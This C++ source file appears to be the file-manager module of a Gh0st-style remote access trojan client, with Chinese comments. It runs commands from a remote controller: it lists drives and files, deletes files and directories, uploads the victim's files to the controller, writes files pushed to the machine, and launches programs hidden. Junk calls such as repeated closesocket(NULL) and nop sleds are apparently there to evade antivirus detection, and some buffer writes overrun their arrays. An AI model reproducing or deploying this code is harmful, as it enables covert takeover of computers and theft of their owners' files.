// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "FileManager.h"
#include <tchar.h>

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
    SHFILEINFO	sfi;
    if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
        dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
    else
        dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

    SHGetFileInfo
        (
        lpFileName,
        dwFileAttributes,
        &sfi,
        sizeof(SHFILEINFO),
        SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
        );

    return sfi.iIcon;
}


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
	closesocket(NULL);
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		DeleteFileA((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		////printf("删除目录 %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上传文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上传文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((TCHAR *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
        OpenFile((TCHAR *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
}


bool CFileManager::MakeSureDirectoryPathExists(LPCSTR pszDirPath)
{
	
	closesocket(NULL);
	
    LPSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPSTR)malloc(sizeof(TCHAR) * (lstrlenA(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpyA(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == '\\') && (*(p+1) == '\\'))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != '\\')
            {
                p = CharNextA(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != '\\')
            {
                p = CharNextA(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == ':') // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == '\\'))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == '\\')
            {
                *p = '\0';
                dwAttributes = GetFileAttributesA(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectoryA(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = '\\';
            }

            p = CharNextA(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}
bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{

	GetForegroundWindow();

    TCHAR	lpSubKey[500];
	HKEY	hKey;
    TCHAR	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
    TCHAR	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	
	GetInputState();
	
    const TCHAR *lpExt = _tcsrchr(lpFile, TEXT('.'));
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm pushad;
	__asm nop;
	__asm popad;
	if (!lpExt) return false;
	__asm nop;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) 
        return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	
	GetInputState();
	
	RegCloseKey(hKey);
	
	__try
	{
		StartService(NULL,NULL,NULL);
	}
	__finally
	{
		__asm nop;
	}
	
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, TEXT("%s\\shell\\open\\command"), strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
    //FIXME: 到底是ARRAYSIZE还是sizeof，需要考证一下。by zhangyl
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	
    TCHAR szModule[MAX_PATH];
	
	RegCloseKey(hKey);

	CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
	
	lpstrCat = _tcsstr(strTemp, TEXT("\"%1"));
	if (lpstrCat == NULL)
        lpstrCat = _tcsstr(strTemp, TEXT("%1"));
	
	if (lpstrCat == NULL)
	{
		
		closesocket(NULL);
		
		lstrcat(strTemp, TEXT(" "));
		lstrcat(strTemp, lpFile);
	}
	else
	{
		
		closesocket(NULL);
		
		lstrcpy(lpstrCat, lpFile);
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = TEXT("WinSta0\\Default"); 
	
	
	__try
	{
		CloseServiceHandle(NULL);
	}
	__finally
	{
		__asm nop;
	}
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}
UINT CFileManager::SendDriveList()
{
	
	GetForegroundWindow();
	
    TCHAR	DriveString[256];
	// 前一个TCHAR为令牌，后面的52TCHAR为驱动器跟相关属性
	//BYTE	DriveList[1024];
    TCHAR	DriveList[1024] = { 0 };
    TCHAR	FileSystem[MAX_PATH];
    TCHAR	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	
	closesocket(NULL);
	
	GetLogicalDriveStrings(ARRAYSIZE(DriveString), DriveString);
	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间

    TCHAR szModule[MAX_PATH];
	DWORD dwOffset;
	for ( dwOffset = 1; *pDrive != TEXT('\0'); pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		GetTickCount();
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		GetTickCount();
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		
		closesocket(NULL);
		
		// 计算磁盘大小
		if (pDrive[0] != TEXT('A') && pDrive[0] != TEXT('B') && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		
		
		closesocket(NULL);
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 4, &FreeMB, sizeof(unsigned long));
		
		
		closesocket(NULL);
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 6, sfi.szTypeName, nTypeNameLen * sizeof(TCHAR));
        memcpy(DriveList + dwOffset + 6 + nTypeNameLen, FileSystem, nFileSystemLen * sizeof(TCHAR));
		
		dwOffset += (6 + nTypeNameLen + nFileSystemLen);
	}

    dwOffset *= sizeof(TCHAR);
	return Send((LPBYTE)DriveList, dwOffset);
}


UINT CFileManager::SendFilesList(LPCSTR lpszDirectory)
{
    TCHAR* pszRequestDirectoryWide = (TCHAR*)lpszDirectory;

	closesocket(NULL);
	
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	TCHAR	strPath[MAX_PATH];
    TCHAR*  pszFileName = NULL;
    TCHAR*	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	
	closesocket(NULL);
	
    lpList = (TCHAR *)LocalAlloc(LPTR, nBufferSize);
	
    wsprintf(strPath, _T("%s\\*.*"), pszRequestDirectoryWide);
	hFile = FindFirstFile(strPath, &FindFileData);

	
	closesocket(NULL);
	
	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	lpList[0] = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (TCHAR *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
        if (_tcscmp(pszFileName, _T(".")) == 0 || _tcscmp(pszFileName, _T("..")) == 0)
			continue;
		// 文件属性 1 TCHAR
		lpList[dwOffset] = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 TCHAR
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen * sizeof(TCHAR));
		dwOffset += nLen;
		lpList[dwOffset] = 0;
		dwOffset++;

        TCHAR szFullFilePath[MAX_PATH] = { 0 };
        wsprintf(szFullFilePath, _T("%s\\%s"), pszRequestDirectoryWide, pszFileName);


        //不能用FindFileData.dwFileAttributes，它与GetFileAttributes获得结果不一样
        int iconIndex = GetIconIndex(pszFileName, GetFileAttributes(szFullFilePath));
        //文件图标索引，TODO: 不同版本的Windows系统，图标索引会不一样吗？
        memcpy(lpList + dwOffset, &iconIndex, sizeof(int));

        TCHAR szIconIndex[128] = { 0 };
        wsprintf(szIconIndex, _T("client: %s-%d\n"), pszFileName, iconIndex);
        ::OutputDebugString(szIconIndex);
		
		// 文件大小 8 字节
		memcpy(lpList + dwOffset + 2, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 6;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 4;
	} while(FindNextFile(hFile, &FindFileData));

    nRet = Send((LPBYTE)lpList, dwOffset * sizeof(TCHAR));

	
	closesocket(NULL);
	
	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}


bool CFileManager::DeleteDirectory(LPCSTR lpszDirectory)
{
	
	closesocket(NULL);
	
	WIN32_FIND_DATAA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintfA(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	char strBfz5[5] = {0};
	strBfz5[0] = '%';
	strBfz5[1] = 's';
	strBfz5[2] = '\\';
	strBfz5[3] = '%';
	strBfz5[4] = 's';
	strBfz5[5] = '\0';

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintfA(strDirectory, strBfz5, lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintfA(strFile, strBfz5, lpszDirectory, wfd.cFileName);
				DeleteFileA(strFile);
			}
		}
	} while (FindNextFileA(hFind, &wfd));
	
	
	closesocket(NULL);
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectoryA(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}



UINT CFileManager::SendFileSize(LPCSTR lpszFileName)
{	
	closesocket(NULL);
	
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpyA(m_strCurrentProcessFileName, lpszFileName);

	
	closesocket(NULL);
	
	hFile = CreateFileA(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	
	closesocket(NULL);
	
	// 构造数据包，发送文件长度
	int		nPacketSize = lstrlenA(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	
	closesocket(NULL);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlenA(lpszFileName) + 1);

	
	closesocket(NULL);
	
	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	
	closesocket(NULL);
	
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	
	closesocket(NULL);
	
	hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	
	closesocket(NULL);
	
	CKeyboardManager::MySetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	
	closesocket(NULL);
	
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	
	closesocket(NULL);
	
	LocalFree(lpPacket);

	return nRet;
}
// 传送下一个文件
void CFileManager::UploadNext()
{
	
	closesocket(NULL);
	
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
	
	closesocket(NULL);
	

}
int CFileManager::SendToken(BYTE bToken)
{
	
	closesocket(NULL);
	
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	
	closesocket(NULL);
	
	if (lpBuffer[lstrlenA((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCSTR lpPathName)
{
	
	closesocket(NULL);
	
	WIN32_FIND_DATAA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlenA(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	char strBfz7[7] = {0};
	strBfz7[0] = '%';
	strBfz7[1] = 's';
	strBfz7[2] = '%';
	strBfz7[3] = 's';
	strBfz7[4] = '*';
	strBfz7[5] = '.';
	strBfz7[6] = '*';
	strBfz7[7] = '\0';

	wsprintfA(lpszFilter, strBfz7, lpPathName, lpszSlash);

	
	
	closesocket(NULL);
	
	HANDLE hFind = FindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintfA(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintfA(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFileA(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer()
{
	
	closesocket(NULL);
	
	if (!m_UploadList.empty())
		m_UploadList.clear();
	
	closesocket(NULL);
	
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	
	closesocket(NULL);
	
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// 保存文件长度
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	
	
	closesocket(NULL);
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind = FindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	
	closesocket(NULL);
	

	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	
	closesocket(NULL);
	
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATAA FindFileData;
	
	closesocket(NULL);
	
	HANDLE hFind = FindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	
	closesocket(NULL);
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	
	closesocket(NULL);
	
	HANDLE	hFile = 
		CreateFileA
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	
	closesocket(NULL);
	
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
	
	closesocket(NULL);
	

}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	
	closesocket(NULL);
	
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// 得到数据在文件中的偏移

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	
	dwBytesToWrite = nSize - 8;
	
	
	closesocket(NULL);
	
	HANDLE	hFile = 
		CreateFileA
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	
	closesocket(NULL);
	
	CKeyboardManager::MySetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		// 写入文件
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
// 	if (nRet <= 0)
// 		printf("文件写入失败");
	CloseHandle(hFile);
	// 为了比较，计数器递增

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	
	closesocket(NULL);
	
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
	
	closesocket(NULL);
	

}
void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	
	closesocket(NULL);
	
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	
	closesocket(NULL);
	
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	
	closesocket(NULL);
	
	LPCTSTR lpExistingFileName = (TCHAR *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	CKeyboardManager::MyMoveFile(lpExistingFileName, lpNewFileName);
	
	closesocket(NULL);
	
	SendToken(TOKEN_RENAME_FINISH);
}
